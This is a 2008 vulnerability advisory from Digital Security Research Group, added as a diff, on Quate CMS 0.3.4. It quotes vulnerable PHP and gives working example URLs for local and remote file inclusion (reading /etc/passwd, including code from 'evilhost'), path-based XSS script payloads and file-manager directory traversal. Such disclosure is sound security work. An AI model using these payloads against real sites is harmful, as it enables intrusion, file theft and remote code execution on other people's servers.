@@ -1,0 +1,131 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-030
+
+
+Application:                    Quate CMS
+Versions Affected:              0.3.4
+Vendor URL:                     http://www.quate.net/
+Bugs:                           RFI, Multiple LFI, Directory traversal, Multiple XSS
+Exploits:                       YES
+Reported:                       18.03.2008
+Second report:                  25.03.2008
+Vendor response:                NONE
+Solution:                       NONE
+Date of Public Advisory:        23.05.2008
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Quate CMS system has multiple security vulnerabilities:
+
+1. Multiple Remote/Local File Include
+2. Multiple Linked XSS vulnerabilities
+3. Directory traversal
+
+
+Details
+*******
+
+1. Quate CMS has Multiple Local File Include vulnerabilities.
+
+1.1 Local File Include vulnerability found in script admin/includes/footer.php
+
+Code
+****
+#################################################
+
+if ($not_logged_in != 1) {
+ if (file_exists("includes/themes/" .$row_secure['account_theme']. "/footer.php")) {
+  require_once("themes/" .$row_secure['account_theme']. "/footer.php");
+ } else {
+  require_once("themes/" .$admin_template_default. "/footer.php");
+ }
+} else {
+ require_once("themes/" .$admin_template_default. "/footer.php");
+}
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/admin/includes/footer.php?admin_template_default=../../../../../../../../../../../../../etc/passwd%00
+http://[server]/[installdir]/admin/includes/footer.php?row_secure[account_theme]=../../../../../../../../../../../../../etc/passwd%00
+http://[server]/[installdir]/admin/includes/footer.php?not_logged_in=1&admin_template_default=../../../../../../../../../../../../../etc/passwd%00
+
+
+1.2 Remote and Local File Include vulnerability found in script admin/includes/header.php
+
+Code
+****
+#################################################
+
+if ($bypass_installed != 1) {
+        if (!is_file("../includes/installed")) {
+                ...
+                require("../includes/simple_gui.php");
+                exit();
+        }
+}
+
+if ($bypass_restrict != 1) {
+ require_once($secure_page_path. "includes/secure.php");
+}
+
+$admin_template_default = "default";
+if ($not_logged_in != 1) {
+ //echo $row_secure['account_theme'];
+ if (file_exists("includes/themes/" .$row_secure['account_theme']. "/header.php")) {
+  require_once("themes/" .$row_secure['account_theme']. "/header.php");
+ } else {
+  require_once("themes/" .$admin_template_default. "/header.php");
+ }
+} else {
+ require_once("themes/" .$admin_template_default. "/header.php");
+}
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/admin/includes/header.php?bypass_installed=1&secure_page_path=http://evilhost/info.php%00
+http://[server]/[installdir]/admin/includes/header.php?bypass_installed=1&bypass_restrict=1&row_secure[account_theme]=../../../../../../../../../../../../../etc/passwd%00
+
+
+---------------------------------------------------------------------
+
+
+2. Linked XSS in Path vulnerability found in following pages:
+
+/admin/index.php
+/admin/login.php
+/admin/credits.php
+/upgrade/index.php
+
+Example:
+
+http://[server]/[installdir]/admin/login.php/"><script>alert("DSecRG XSS")</script>
+http://[server]/[installdir]/upgrade/index.php/"><IMG SRC="javascript:alert('DSecRG XSS')
+
+---------------------------------------------------------------------
+
+
+3. File Manager directory traversal
+
+Administrator can access system files outside htdocs directory using directory traversal vulnerability.
+
+http://[server]/[installdir]/admin/filemanager.php?type=edit&dir=/../../../../../../../../..&file=boot.ini
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsec [dot] ru
+                http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-05-23]
